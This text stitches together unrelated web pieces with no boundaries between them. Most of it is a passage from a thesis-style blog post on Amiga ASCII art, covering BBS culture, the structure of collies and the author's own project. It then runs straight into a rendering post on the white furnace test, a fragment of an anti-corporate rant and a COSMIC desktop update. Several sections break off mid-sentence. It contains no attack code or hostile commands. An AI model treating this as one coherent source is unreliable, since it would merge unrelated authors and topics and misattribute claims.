registration, users were often asked for name and address information and sometimes also for certain data communication settings.<sup><a href="#fn39" id="fnref39">[39]</a></sup></p><p>BBSs were navigated using keyboard commands in various menus. There were several different menu levels, usually varying according to the software the BBS used. Typically, BBSs included discussion areas, file areas, private messages, bulletins, and in some systems, it was also possible to play text-based games or chat in real-time with other users and the BBS administrator. File exchange was a significant part of BBSs, as uploading files earned usage time in the BBS.<sup><a href="#fn40" id="fnref40">[40]</a></sup></p><p>BBS activities remained for a long time within a small group interested in data communication and microcomputers. Gradually, as modem speeds increased towards the end of the 1980s, it began to spread to the awareness of larger user groups. What started primarily to facilitate mutual information exchange began to form a subculture. The age and user structure began to change, and at the same time, the ways BBSs were used diversified significantly. In the 90s, the subculture was mainly composed of young men aged 15-20. They shared an interest in computers and the possibilities they created<sup><a href="#fn41" id="fnref41">[41]</a></sup>. BBSs were significant communal forums for social activity. They served as meeting places for friend groups as well as hobbyist and subcultural groups<sup><a href="#fn42" id="fnref42">[42]</a></sup>.</p><p>Due to the home computers on the market that were incompatible with each other, hobbyists were loosely divided into different user groups specific to each computer. It was possible to log into BBSs with any computer, but due to the different character set standards, they might not necessarily display or function correctly. As a result, Amiga and MS-DOS-based PCs developed slightly different user cultures, even if their basic vibe was the same<sup><a href="#fn43" id="fnref43">[43]</a></sup>.</p><h3 id="235-ascii-art-to-decorate-bbs-boards">2.3.5. ASCII ART TO DECORATE BBS BOARDS</h3><p>Data transfer via modem was very slow and therefore consisted mainly of text files. Terminal programs used to connect to the BBSs also operated under text-based operating systems. Due to their text-based nature, the BBS user interfaces were quite austere. There arose a need to embellish these interfaces and create images.</p><p>Amiga and PC-based BBSs started to be decorated with ASCII graphics. Most of the BBSs operated on PCs, which were not compatible with Amiga (Figure 12). Graphics on the PC were created using the extended character set and font of the original IBM PC, known as ANSI art.</p><figure><img alt="The word GRMMXI in PC and Amiga ASCII styles. The PC style word looks like it's outline is made of dashed lines while the Amiga has a more seamless outline." loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/qzXH73V-55-749.png" width="749" height="144"><figcaption>(Figure 12.) The same logo in IBM PC's (left) and Amiga's (right) fonts.</figcaption></figure><p>ANSI art is a form of ASCII art. However, it significantly differs from other forms of ASCII art, as ANSI art mainly consists of rectangular raster bars and looks more like pixel graphics than actual text art. PC computers' ROM (<em>read only memory</em>) contained the character set and font specified on <em>"code page 437"</em>. This character set includes the 128 characters of the ASCII standard and additionally a set of graphical elements specifically for drawing tables and graphics. However, ANSI images are primarily composed of five characters, whose different strength raster surfaces enable the creation of color fields and shading on an 80x25 grid. Using color was also possible through terminal control codes included in the terminal control standard. The typical ANSI color palette consists of 16 colors and 8 background colors, which was later expanded to 16 colors and 8 background colors. This allowed for significantly more imposing images than traditional ASCII graphics.<sup><a href="#fn44" id="fnref44">[44]</a></sup></p><div><h4 id="note-from-2023">Note from 2023:</h4><p>Because the tools for creating ANSI and Amiga ASCII are mostly the same, many contemporary Amiga ASCII pieces also use ANSI colours. However, if colored Amiga ASCII is viewed on an actual Amiga, the colours wouldn't show.</p></div><p>ANSI graphics were originally used in <em>crack intros</em><sup><a href="#fn45" id="fnref45">[45]</a></sup> for illegal software copies and in the logos of BBS login pages. Before long, ANSI artists formed groups and began publishing monthly packages containing ANSI art. Activities were typically organized, and intergroup competition became an essential factor in maintaining the intensity of the hobby.</p><p>A few comprehensive studies and other literature have been written on ANSI art and its related culture, so I will omit its in-depth discussion from this thesis.</p><p>Amiga ASCII was largely created for applications related to BBS boards. BBS administrators needed beautiful login pages and ASCII art to embellish various sections of the BBS to improve the user interface.</p><p>In the early 1990s, Amiga ASCII art groups and individuals began to release their materials as <em>collies</em> or logo collections. This convention can be seen as having come from the ANSI art side, where groups published their works in art packs. However, Amiga ASCII collies were individual text files containing all the material, while ANSI art packs were collections of separate files.</p><p>Today, BBS boards have no practical significance and exist mostly for nostalgic purposes. They can also be a status symbol for groups and a way to pass the time. However, various websites on the Internet have replaced the BBSs as the publication channel for collies<sup><a href="#fn46" id="fnref46">[46]</a></sup>.</p><h3 id="236-what-is-a-colly">2.3.6. WHAT IS A COLLY?</h3><p>Colly, or collection, is a text file containing a collection of Amiga ASCII artworks created by one or more artists. The primary purpose of collies is to showcase the latest works of an ASCII artist in one place.</p><p>The term "colly" originated from the Amiga ASCII group <em>ART</em>'s 1992 released logo collection called <em>Collection volume 1</em> <sup><a href="#fn47" id="fnref47">[47]</a></sup>, after which it became a common practice within the subculture. Collies were the primary publishing format for Amiga ASCII art and have remained so to this day.</p><p>Rarely was Amiga ASCII used for traditional, representational art. However, representational images might be used in collies as illustrations. The main content of collies was typographic logos. They were usually made to a maximum size of 80x25, as the terminal programs used to connect to BBS were this size. Logos were typically 7-12 letters long, depending on the width of the logo font. The letters of a logo were often adjusted according to the length of the word and its intended use. The same logo style could be applied to words of different lengths. Even four-letter logos could be stretched to 80 cells to suit its use in BBS. Often, ornaments or texturing were made around the logo to frame the logo itself<sup><a href="#fn48" id="fnref48">[48]</a></sup>.</p><p>Some collies were collections of miscellaneous logos, advertisements, and other materials used in BBS made by the artist. However, many collies showcased the artist's newly developed typographic style to make logos. Collies could also be made in collaboration with another artist. Then both artists would create their own version of a particular word, and the person who commissioned the word could choose which one to use<sup><a href="#fn49" id="fnref49">[49]</a></sup>. Collies were often thousands of lines long.</p><p>Artists releasing collies competed with other artists for the best colly. An individual or group that made a beautiful colly gained respect and status among members of the subculture. Makers of high-quality ASCII art could also ascend within the group's internal hierarchy or receive invitations to generally more esteemed groups. As in other computer enthusiast subcultures, competition among groups and their members was a key factor in motivating groups to publish and maintain the quality of collections.</p><p>A colly traditionally consists of the following elements:</p><p>A.

Only those with a functional BBS use a BBS advertisement. (Figure 13).</p><p>BBS advertisements were also made for BBSs other than the group's own. These ads could be spread on discussion areas reserved for ads in other BBSs. The more impressive the ad and the more famous the artist who made it, the more people it attracted to visit the advertised BBS<sup><a href="#fn51" id="fnref51">[51]</a></sup>.</p><h4 id="b-title-of-the-colly-creators-logo-and-group-logo"><strong>B. Title of the colly, creator's logo, and group logo</strong></h4><p>At the beginning of collies, there is usually a title. The title may include the name of the colly creator, the name of the group the creator belongs to, and the name of the collection. The title is important because it reflects the theme and style of the collection and gives a taste of what's to come. It serves as an introduction to the following sections. (Figure 15).</p><figure><img alt="Various logos, text and patterns in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/q0sKBwdl_E-640.png" width="640" height="1474"><figcaption>(Figure 15.)

Table of contents (index)</strong></h4><p>The table of contents lists the ASCII images contained in the collection in numerical order. In the list, names are usually written in plain text. Tables of contents are used especially in long collies, which may contain hundreds of logos and other ASCII images made for various parties.</p><p>Collies often also contain a brief introduction, where the creator writes about the origin or theme of the collection, their own life, news, or other matters related to the subculture. This allows the creator to explain the background of their colly, express their thoughts related to drawing, or reinforce their position as an Amiga ASCII creator.

The actual content of the collection, i.e., ASCII logos, BBS advertisements, and FILE_ID.DIZ files</strong></h4><p>The main content of collies consists of ASCII logos made for others, BBS advertisements, and file_id.diz text files. These usually come as requests from other members of the subculture. For example, a BBS administrator might ask an Amiga ASCII artist to create a login page logo for their BBS. Then the creator of the colly can use their newly developed style to create a logo for the BBS administrator to use. So, ASCII logos were often put to some use. ASCII logos could be requested by anyone, individuals, or groups.</p><p>FILE_ID.DIZ is an ASCII text file that contains a short description of the content of the archive file. Many BBSs allowed users to upload their own files for others to download. BBS administrators might require the person uploading a file to also provide a description of the content they are uploading. To standardize descriptions, archive files were supplemented with a FILE_ID.DIZ file to provide a clear description of the content to be downloaded. The text file was required to contain at least the program name, version number, and a description of the file to be downloaded. Traditionally, FILE_ID.DIZ was allowed to be 10 lines long, with each line containing a maximum of 45 characters<sup><a href="#fn52" id="fnref52">[52]</a></sup>.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/3C-ZTpt4aK-640.png" width="640" height="306"><figcaption>(Figure 16.) FILE_ID.DIZ file for nuancE from the colly "zeitgeist|moving|on". The top bar serves as a separator and provides the logo number, plain-language name, and purpose (FILE_ID.DIZ), as well as the collection name. The numbers and spacing symbols around the logo are not part of the logo itself but indicate row and character count. In this FILE_ID.DIZ logo, the requester's name is stylized. Placeholder text is left below it for layout testing when there is no actual content yet. The bottom corner contains the artist's pseudonym abbreviation zS! i.e., Zeus.</figcaption></figure><p>However, Amiga ASCII artists began to use this file for their own needs, often as an icon for the colly. In this case, FILE_ID.DIZ contains the name of the colly, the creator, and some release information. The purpose of the icon is to be as impressive as possible to attract the attention of others, as it serves as a preview for the actual colly.</p><p>Different logos are separated by a separator. The separator also structures the content and helps with navigation. The separator usually lists the logo number, which matches the table of contents, the name of the colly, the name of the logo, and/or the name of the person requesting the logo. Because logos are often difficult to read, the text of the logo in the separator is often written in plain text.</p><p>Amiga ASCII logos always have the artist's own abbreviation attached, indicating the creator and copyright. The worst violation is to steal someone else's style or logo and claim it as one's own. If caught, the punishment could be exclusion from the subculture<sup><a href="#fn53" id="fnref53">[53]</a></sup>.</p><h4 id="f-credits"><strong>F. Credits</strong></h4><p>Credits provide the closing details for the colly. It lists the creator's name (or names) and possible guest appearances, i.e., if another Amiga ASCII artist participated in the creation of the colly. The credits often state the release date, file size, file name, font used, text editor or other technical details. Often the credits also mention what music the creator listened to while creating the colly.</p><h4 id="g-greetings"><strong>G. Greetings</strong></h4><p>Greetings, or <em>greets</em>, list the creator's personal acquaintances.</p><h4 id="h-acknowledgments-respects"><strong>H. Acknowledgments (respects)</strong></h4><p>In acknowledgments, or <em>respects</em>, Amiga ASCII artists who are admired and respected by the creator are listed, even if they are not personally known.</p><p>Greetings and acknowledgments were once important for increasing visibility. In listings called ASCII charts, Amiga ASCII artists were ranked by popularity using various metrics. Amiga ASCII artists could be publicly voted on, or the greetings and acknowledgments included in collies were counted together, measuring the artist's popularity. Those who received the most greetings and acknowledgments from other artists topped the list, in turn increasing their popularity and visibility of their collies. Rankings also took into account for whom other artists had made logos. This partly motivated designing logos for other ASCII artists<sup><a href="#fn54" id="fnref54">[54]</a></sup>.</p><p>The largest archive site for Amiga ASCII collies, <em><a href="http://asciiarena.com/">asciiarena.com</a></em><sup><a href="#fn55" id="fnref55">[55]</a></sup>, lists about 4,000 collies from 780 different artists spanning the years 1992-2015. Most of them were released before the year 2000. While Amiga ASCII might be considered a niche subculture, the number of artworks and artists indicates a significant phenomenon.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>Asciiarena.com is nowdays <a href="https://asciiarena.se/">asciiarena.se</a>, but unfortunately it seems to be down every once in a while.

MY STARTING POINT FOR CREATING ASCII ART</h2><p>I didn't get to witness the golden days of BBSs and ASCII art or belong to the ASCII art-related subculture because the subculture had already waned by the time I started my computer hobbies in the early 2000s. However, I remember what the Internet was like in the late 90s and early 2000s. It was a magical and mysterious place for me, where every now and then, I'd encounter these strange images made up of mere characters. These could be seen in text-based info files of downloaded files, comments on discussion boards, or hidden in a website's source code. These images intrigued me, and at about ten years old, I too wanted to master this art of image-making: slowly, one letter at a time, I typed an image of a DJ playing records. The technique was challenging and time-consuming enough that I tried it only once.</p><p>In January 2014, I found a web-based hobby magazine on the internet, <em>OrDeR Of ThE ShAdOw Wolf</em>, a cyberzine, made by the Dutch electronic music-producing artist Danny "Legowelt" Wolfers. For a moment, the internet felt magical and mysterious again, as I read text laid out in green monospaced font on a black background, with titles and images made in ASCII.</p><p>Legowelt starts the cyberzine with these words:</p><blockquote><p>"Welcome to the first issue of ORDER OF THE SHADOW WOLF, a cyberpunk e-zine in true original text format. This is how e-zines looked before the dawn of the internet in the 1980s and early 1990s. They were distributed via BBS's [...]. People would download these e-zines on their 300 baud modems and read them on their monochrome green screens late at night. Difficult to imagine now but doing this felt like the most exciting thing in the world, surrounded by a mystique of hacker romanticism and being a cyberpunk pioneer. It was a time when your mum and retarded jock cousin weren't on the internet, even more hardcore...you were probably the only person in your whole town or area logged into cyberspace!" <sup><a href="#fn56" id="fnref56">[56]</a></sup></p></blockquote><p>I wanted to delve into this obscure subculture and the way of making images. It felt fascinating. I also don't believe I'm very skilled in illustrating, designing logos, or producing visual material in general. I wanted to enhance my creative expression. After trying to draw my first ASCII image, I found that making logos and images with the constraints set by ASCII is quite liberating. The limitation of the ASCII character set forces creativity and uses it as a strength for making images. The primitive nature of this medium felt like the right method to develop my expression.</p><p>I set the following goals for myself before embarking on the project:</p><blockquote><p>"I intend to try various styles and techniques to draw logos with ASCII. Initially, at least, I will use the word "GRMMXI" as the text for my logos, which represents my friends/classmates/artistic community for whom, and to whom, I'm creating these logos. This will keep me motivated. Through experimentation, I aim to observe shapes, typography, logos, and textures in a new light, thereby evolving as a graphic designer. I also haven't done much logo design before, so I hope this approach brings new perspectives to logo design."</p></blockquote><h3 id="311-finding-the-right-method">3.1.1. FINDING THE RIGHT METHOD</h3><p>I work as a web designer, so I started working on my first experiments with the text editing tool I know best: a code editor. However, I soon realized that with the default font of the code editor, I couldn't produce results that met my expectations: the characters didn't mesh well together. I wanted to know how ASCII art is really made.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/XvtWRhhzHJ-380.png" width="380" height="223"><figcaption>(Figure 17.) FILE_ID.DIZ file from the collective publication of the Break group.</figcaption></figure><p>While getting acquainted with ASCII art, I wasn't yet aware of the existence of Amiga ASCII. From the site <em><a href="http://sixteen-colors.net/">sixteen-colors.net</a></em><sup><a href="#fn57" id="fnref57">[57]</a></sup>, which archives ASCII and ANSI art, I found the logo of the <em>Break</em> group (Figure 17). I had never seen ASCII graphics of this style before, where the lines connect almost seamlessly. I wanted to make my thesis using this technique and began to delve into the technical characteristics of this style.</p><p>In my search, I found the website <em><a href="http://asciiarena.com/">asciiarena.com</a></em>, which archives Amiga ASCII collies. It is the most comprehensive site archiving Amiga ASCII and now serves as the primary publishing channel for new Amiga ASCII works for many. The site is full of increasingly impressive Amiga ASCII collies, and browsing through the works of others served as a significant source of inspiration throughout the project. I decided that I wanted to publish my project on this site in its original colly format.</p><p>I found and installed the original Amiga fonts<sup><a href="#fn58" id="fnref58">[58]</a></sup> in TTF format on my computer. This allowed me to start creating Amiga ASCII images and delve deeper into the method of making ASCII images. I set my text editor's user settings to use the Amiga Topaz font, reduced the line height, and changed the colors to black and white. This allowed me to achieve the desired results.</p><figure><img alt="Logo in black and white filled ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/xFJQZQunWZ-822.png" width="822" height="406"><figcaption>(Figure 18.) My first ASCII attempt. When looked at closely, the above appears as a heap of random letters and symbols. However, by squinting, one can discern that it reads GRMMXI. Each character has its texture, contrast, and shape, which, when placed side by side, are reduced to a larger cohesive form or surface. I later learned that this is called filled ASCII, which was a common method of creating ASCII on PC computers.</figcaption></figure><h2 id="32-production-process">3.2. PRODUCTION PROCESS</h2><h3 id="321-description-of-creating-amiga-ascii-images">3.2.1. DESCRIPTION OF CREATING AMIGA ASCII IMAGES</h3><p>Typing each character by hand required absolute focus. However, using the cut-paste technique, experimenting with new shapes and ideas was easy and smooth. This process enabled constant evaluation of the work. From the same logo, several different variations could be made.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/fb6TwRtWHq-640.png" width="640" height="578"><figcaption>(Figure 19.) Logo variations. My early logo exercises, experimenting with different variations of an easily readable logo.</figcaption></figure><p>However, creating logos began to feel challenging and rigid. Comparing my logos to those made by others, I felt that I was not succeeding in creating an original yet stylish logo type. I tried sketching ASCII logos in a drawing book, but that also felt frustrating since, for instance, curved shapes are tricky, if not impossible, to make with Amiga ASCII. It was better to draft directly in the text editor and let the restrictions set by the characters influence the formation of the shapes.</p><p>For this reason, I wanted to break free and create images and logos that deviated from Amiga ASCII conventions. I also realized that I didn't need to follow the footsteps of previous ASCII artists and therefore didn't set clear content guidelines. I only decided in advance that I would try different methods and see what felt right and most inspiring. Hence, the image themes don't follow a clear unified line; the result consists of different experiments.</p><p>I tried a more expressive form language by creating logos that consisted of sharp angles and straight lines combined with wiggly shapes using parenthesis. Using parentheses seemed promising since I hadn't seen many using them in their logos. I challenged myself and created a "slimy" logo that dripped downward using parentheses, which I found successful.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/68pGs-fmYD-432.png" width="432" height="369"><figcaption>(Figure 21.) Baltic Circle. Slime logo.</figcaption></figure><p>In one logo experiment, I added eyes and a mouth, making the letters look like fun characters. This inspired me to try creating human figures. With the special characters of the Amiga ASCII character set, I was able to create faces in different perspectives. The easiest facial features were the eyes, which I made using "hatted" variatons of a-, o-, and u-letters. However, making the mouth was challenging since very few Amiga ASCII characters are diagonally inclined. Drawing hands and feet also proved extremely difficult because of their round shapes.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/oHBF8UmsLN-640.png" width="640" height="754"><figcaption>(Figure 20.) Character sketches.</figcaption></figure><p>However, this image theme felt funniest and most inspiring to me. I felt most creative when making characters. According to Michael Hischer, whom I interviewed, representational images weren't highly valued in the past, but they are now viewed positively<sup><a href="#fn59" id="fnref59">[59]</a></sup>, which motivated me to continue drawing characters.</p><p>My enthusiasm for creating images experienced highs and lows. My initial goal was to draw at least one ASCII image per day, which I did in the early stages of the project. However, making logos felt challenging, and I became frustrated with my drawing. Satisfaction was hard to come by. Additionally, immersing myself in the topic and writing about it took a significant amount of energy. Writing the thesis was challenging from start to finish, as I realized early on that I had chosen a nearly unexplored topic. However, Amiga ASCII as a subject is extremely interesting, which helped me persevere in creating the thesis.</p><h3 id="322-making-the-colly">3.2.2. MAKING THE COLLY</h3><p>In the end, I created over 50 different logo and character experiments. I thought the number was too small to produce a decent final product, but when making the colly, I realized it was still sufficient.</p><p>I refined the ASCII images I had made and constructed the colly using the PabloDraw program. PabloDraw<sup><a href="#fn60" id="fnref60">[60]</a></sup> is an ASCII/ANSI editor for modern operating systems. It is specifically designed for ASCII art creation and includes Amiga's original Topaz font and column settings. For the colly, I had no clear idea; instead, I brought my separate image experiments into the program and started building suitable combinations from them.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>Nowdays I would recommend using <a href="https://blocktronics.github.io/moebius/">Moebius</a> instead of PabloDraw.</p></div><p>The pieces fell into place on their own. At the beginning of the colly, I created a dreamscape that continues in a comic-like manner with a person pondering the creation of a thesis, adding a meta-level to the colly. From within the dreamlike landscape, the title of the colly, "innocence," is revealed, which I chose as a name to describe, firstly, the childishly innocent starting point of my authorship as a new ASCII artist, but also proclaiming my innocence in creating an unconventional colly stemming from my background.</p><p>After this, the colly continues with various styles and experiments that vaguely intertwine. My original ASCII images laid the foundation for the colly, but I still had to do a lot of work adding backgrounds, decorations, and details.</p><p>I find the final result interesting, and I am satisfied with it. The colly turned out to be significantly illustrative, which deviates from the traditions of Amiga ASCII collies. However, I believe this is a positive aspect since the colly as a whole remains cohesive and intriguing.</p><figure><img alt="Dot matrix printer printing the colly" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/ML1Cbn8JO6-624.png" width="624" height="19026"><figcaption>(Figure 22.) The final colly!</figcaption></figure><h3 id="323-physical-final-product">3.2.3. PHYSICAL FINAL PRODUCT</h3><p>Collies are usually viewed on a computer screen, but I wanted to materialize my product into a physical form. This seemed like a challenging task, as collies are typically continuous, spanning several pages in length, making them difficult to sensibly present, for example, on the pages of a book.</p><p>I came up with the idea to print my Amiga ASCII images using a dot-matrix printer. It can print on continuous form paper, which modern printers cannot do. Continuous form paper is a continuous strip of paper perforated at regular intervals. Dot-matrix printers were common in the 80s and 90s before the advent of proper inkjet and laser printers. In a dot-matrix printer, graphics are printed as dots by striking pins against a black ribbon onto the paper. This was perfect for my purpose, as my images are black and white and would cover several vertical A4 pages in total. As the device was popular around the same time Amiga ASCII was most commonly produced, it also served as a fitting historical reference.</p><p>However, I don't own such a device, and according to a Facebook poll, none of my acquaintances did either. The device seemed to be outdated technology that no one had. But I didn't give up; I searched for "dot matrix printer" in the Fonecta search service. The search yielded only one result: the printer-manufacturing company, <em>OKI Finland</em>. I emailed them, asking if they knew where I could borrow a dot-matrix printer. Fortunately, and to my surprise, they had one to lend, which I borrowed for a month.</p><figure><img alt="Dot matrix printer printing the colly" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/EwqKIXHCbw-1064.png" width="1064" height="802"><figcaption>(Figure 22.) Printing the colly with a matrix printer.</figcaption></figure><p>However, my luck changed when, upon testing the printer's features, I found out that it was not possible to print a completely continuous image. The printout of my production turned out to be over 5 meters long, and the printer left a margin of about a centimeter every 30 centimeters or so. This is due to the printer's drivers, which were not designed for long print runs, even if it would be theoretically possible. Nevertheless, I didn't let this discourage me, as the idea of the production still comes through despite this.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>I did manage to print it as a "continuous" image by printing one section at a time and then carefully positioning the paper again.</p></div><hr><p>The aim of the project was to explore Amiga ASCII culture, learn to observe forms, typography, and textures in a new way, enhance my creative expression, and gather insights for graphic design.</p><p>Amiga ASCII significantly resembles graphic design. It is used to embellish user interfaces, create logos for clients, and typographic design lies at its core. However, I don't feel that I've gained any practical benefit as a graphic designer from this project. The method of Amiga ASCII is unique, and it has no practical link to today's world. It's hard to instrumentalize. It operates under its own rules, in the margin, outside the mainstream. It is anti-capitalist, even anarchistic, because it is difficult to commercialize or display in art galleries. It can be described as digital folk art or tradition. It pales in expressive power compared to many other art methods. Yet, it's alluring, charming, and delightful because of its peculiar nature.</p><p>I don’t see that I have developed as a designer, but I feel I have gained immensely from the project. I am pleased to have been introduced to such an interesting topic. In my view, I have provided a comprehensive description of the subject. I feel proud to have learned a skill that many people I know had never even heard of, and in that respect, my goal was met: I developed my creative expression. However, I only scratched the surface and see a lot of potential in the method. I definitely intend to continue creating Amiga ASCII art. It would also be great if my project helped me become part of the Amiga ASCII community.</p><p>As Matt “mattmatthew” Yee states in a <em>Blocktronics</em> interview:</p><blockquote><p>"The works done by new and old artists these days are probably the best the scene has ever seen, with a few exceptions. My peers have developed this method further than it has ever been developed before. This is an exciting time to draw." <sup><a href="#fn61" id="fnref61">[61]</a></sup></p></blockquote><p>I look forward to following the development of Amiga ASCII art.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>8 years later, I must say doing this thesis was a real turning point for me! It's difficult to put into words how and how much it benefitted me as a graphic designer or as a person, but as text art is still at the core of my practice, I would say <em>a lot</em>. The "practical" use of Amiga ASCII has mainly come from learning and understanding the <em>modular process</em> of image making, which has enabled me to develop various modular design tools that I've used in my profession as a graphic designer. Even so much that I rarely use any Adobe software anymore.</p><p>I did join the Amiga ASCII community shortly after releasing my thesis, by joining the "Impure!ASCII 1940" group. In 2021 I collaborated with them by making an <a href="https://www.youtube.com/watch?v=X9wodTL9XVA">8 minute long train ride animation</a> that even won the PC Demo compo at Flashparty 2021. I'm really happy how it turned out!</p><p>Even though it's been 8 years, I still feel like I've only scratched the surface of the potential in the method. I don't see myself stopping anytime soon.</p></div><hr><h2 id="sources">SOURCES</h2><h2 id="51-printed-sources">5.1. PRINTED SOURCES</h2><ul><li>Bann, Stephen (1967): <em>Concrete poetry.

<p>The white furnace test is one of my favourite rendering debug tools. But before it was so, it was rather mysterious and abstract to me. Why would a publication proudly show what seemed like empty renders? What does it mean, and why would they care?</p>



<figure><img decoding="async" src="http://lousodrome.net/blog/light/files/2023/09/Conty_2017-diffuse-term-white-furnace-test-500x281.jpg" alt="Slide from the presentation Revisiting Physically Based Shading at Imageworks, in which a white furnace test of the diffuse term is shown." width="500" height="281" srcset="https://lousodrome.net/blog/light/files/2023/09/Conty_2017-diffuse-term-white-furnace-test-500x281.jpg 500w, https://lousodrome.net/blog/light/files/2023/09/Conty_2017-diffuse-term-white-furnace-test-300x168.jpg 300w, https://lousodrome.net/blog/light/files/2023/09/Conty_2017-diffuse-term-white-furnace-test-768x431.jpg 768w, https://lousodrome.net/blog/light/files/2023/09/Conty_2017-diffuse-term-white-furnace-test.jpg 1514w" sizes="(max-width: 500px) 100vw, 500px"><figcaption>What’s up with the empty grey rectangle? The fact that looks empty <em>is</em> the point.<br><em>Revisiting Physically Based Shading at Imageworks</em>, presented at the <a href="https://blog.selfshadow.com/publications/s2017-shading-course/">SIGGRAPH 2017 course: Physically Based Shading in Theory and Practice</a>.</figcaption></figure>



<p>The idea is the following: if you have a 100% reflective object that is lit by a uniform environment, it becomes indistinguishable from the environment. It doesn’t matter if the object is matte or mirror like, or anything in between: it just “disappears”.</p>



<p>Accepting this idea took me a while, but there is a real-life situation in which you can experience this effect. Fresh snow can have an albedo as high as 90% to 98%, i.e. nearly perfect white. Associated with overcast weather or fog, it can sometimes appear featureless and become completely indistinguishable from the sky, to the point you’re left with skiing by feel because you can’t even tell the slope two steps in front of you. Everything is just a uniform white in all directions: the <a href="https://en.wikipedia.org/wiki/Whiteout_(weather)">whiteout</a>.</p>



<figure><img decoding="async" loading="lazy" width="500" height="243" src="http://lousodrome.net/blog/light/files/2023/09/real-life-white-furnace-test-500x243.jpg" alt="Photo taken on a ski track. The ground appears almost uniformly white." srcset="https://lousodrome.net/blog/light/files/2023/09/real-life-white-furnace-test-500x243.jpg 500w, https://lousodrome.net/blog/light/files/2023/09/real-life-white-furnace-test-300x146.jpg 300w, https://lousodrome.net/blog/light/files/2023/09/real-life-white-furnace-test-768x373.jpg 768w, https://lousodrome.net/blog/light/files/2023/09/real-life-white-furnace-test.jpg 1440w" sizes="(max-width: 500px) 100vw, 500px"><figcaption>Last time I visited a white furnace test. Note how the snow surface slope and details are almost invisible, and the sign in the background seems to be floating in the air.</figcaption></figure>



<p>With the knowledge that a 100% reflective object is supposed to look invisible when uniformly lit, verifying that it does is a good sanity test for a physically based renderer, and the reason why you sometimes see those curious illustrations in publications. It’s showing that the math checks out.</p>



<p>Those tests are usually intended to verify that a BRDF is energy preserving: making sure that it is not losing or adding energy. A typical topic for example is <a href="https://google.github.io/filament/Filament.md.html#materialsystem/improvingthebrdfs/energylossinspecularreflectance">making sure materials don’t look darker as roughness increases</a> and inter-reflections become too significant to be neglected. Missing energy is not the only concern though, and a grey environment (as opposed to a white one) is convenient as any excess of reflected energy will appear brighter than it.</p>


<figure>
<figcaption>Demonstration of the white furnace test on ShaderToy, or an expensive way to render an empty image. Press the play button to see the scene revealed.</figcaption></figure>


<p>But verifying the energy conservation of a BRDF is just one of the cases where the white furnace test is useful. Since a Lambertian BRDF with an albedo of 100% is perfectly energy preserving and completely trivial to implement, the white furnace test with such a white Lambert material can be used to reveal bugs in the renderer implementation itself.</p>



<div><p>There are so many aspects of the implementation that can go wrong: the sampling distribution, the proper weighting of the samples, a mistake in the PDF, a pi or a 2 factor forgotten somewhere… Those errors tend to be subtle and can result in a render that still looks reasonable. Nothing looks more like a correct shading than a slightly incorrect one.</p><p>So when I’m either writing a path tracer or one of its variants, or generating a pre-convolved environment map, or trying different sampling distributions, my first sanity check is to make sure it passes the white furnace test with a pure white Lambertian BRDF. Once that is done (and as writing the demonstration shader above showed me once again, that can take a few iterations), I can have confidence in my implementation and test the BRDF themselves.</p></div>



<p>Take away: the white furnace test is a very useful debugging tool to validate both the integration part and the BRDF part of your rendering.<br></p>

It’s good for a lot of things. But it totally fails humanity when large corporations are involved. We should change it before a bunch of our industries collapse under their self-destructive behaviors driven by greed. Because right now, a good investment strategy is to constantly keep investing in companies who irreparably harm themselves and their customers long-term for a quick buck. You just need to build your portfolio of these and dump them once their sell-out is over. And this makes money. An investor would be unwise not to pick a money-making strategy.</p><p>It is in everyone’s best capitalistic interest to exploit others to the max. And when all that could be exploited is, well… no one managing companies thinks about this. The investors want returns now, all the time. The executives know how to sell-out for this and golden-parachute into the next company to do it all again. The employees are laid off and customers are mistreated, but hey - capitalism is to acquire capital. It’s not called moralism.

<div id="readability-page-1" class="page"><div data-v-7773bbb7=""><p>Halloween is fast approaching, so we’re handing out COSMIC treats to all who approach our digital door! These delectable sweets take the form of new features for COSMIC DE, a new desktop environment we’re building for Pop!_OS and other distros. Now take a peek under the mask at the latest progress for COSMIC!</p><h2>Lock and Login Screens</h2><p>Designs and most engineering for COSMIC lock and login screens are now complete!</p></div><div data-v-7773bbb7=""><p>Here, you can check date and time, wifi and battery statuses, keyboard input language, and switch users. From the login screen you can also restart or power off the computer. Meanwhile, using the gear icon will switch your software session (from Pop!_OS with COSMIC DE to Pop!_OS with KDE, for example).</p><p>The login screen defaults to the user that was last logged in.

In this Settings panel, you can choose between default Light and Dark modes, and customize the colors used in each. The team’s been experimenting with theming and the results have ranged from a bright cherry blossom, to a sophisticated red wine, to something one may call…hellish.</p>
    
  <p>Additionally, theming support is being added to cosmic-comp so that any theme changes you make are immediately visible.</p><p><strong>Early design for per-workspace tiling</strong></p><p>Tile windows in one workspace and float windows in another. Initial designs have undergone usability testing, and adjustments are being made to this exciting new feature! We’ll provide more info in a future blog post once it’s closer to being completed.</p><p><strong>Community Contribution: COSMIC Tiling applet</strong></p><p>Eduardo (@edfloreshz <a target="_blank" rel="noopener" href="https://github.com/edfloreshz">on GitHub</a>) has completed an early version of the <a target="_blank" rel="noopener" href="https://github.com/pop-os/cosmic-applets/pull/117">Tiling applet</a> for COSMIC DE.

